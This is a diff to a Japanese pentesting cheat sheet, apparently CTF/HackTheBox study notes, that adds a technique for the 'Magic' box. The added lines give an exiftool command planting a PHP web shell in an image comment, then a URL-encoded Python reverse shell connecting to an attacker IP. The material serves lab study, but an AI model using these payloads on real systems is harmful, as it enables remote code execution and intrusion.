@@ -232,6 +232,7 @@ Nmapで17分かかる処理を1分以内に抑える高速化を実現してい�
 - uri を入力する部分、(url=http://  proxy=http:// ) などのurlがあれば、SSRFがないか確認
 - template fileや 404.phpなどを reverse shell file に書き換えられない確認
 - 画像やPDFをダウンロードできるならして、 exiftool input.jpg　でmeta情報からuser情報を取得できるか確認
+- 画像をuploadできるなら、画像のcommentに exiftool 使って、reverseshell 利用できるか(HackTheBox Magic)確認
 - 掲載されている画像にヒントが無いか確認
 
 ```
@@ -2029,6 +2030,20 @@ Linux ubuntu 4.4.0-17763-................
 
 ```
 
+- exiftool
+
+画像のmetadata のcomment を利用して、reverse shell 
+
+[記事](https://dev.to/krashwin/ctf-learn-1-231i)
+
+[HackTheBox: Magic](https://fahmifj.medium.com/hack-the-box-magic-10-10-10-185-scratch-f534fce85b66)
+
+```
+exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']);?>' image.png
+
+http://10.10.10.185/images/uploads/profile.php.png?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.14.23%22,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call(%5B%22/bin/sh%22,%22-i%22%5D);%27
+
+```
 
 
 - 改行などがうまく表示できていない時
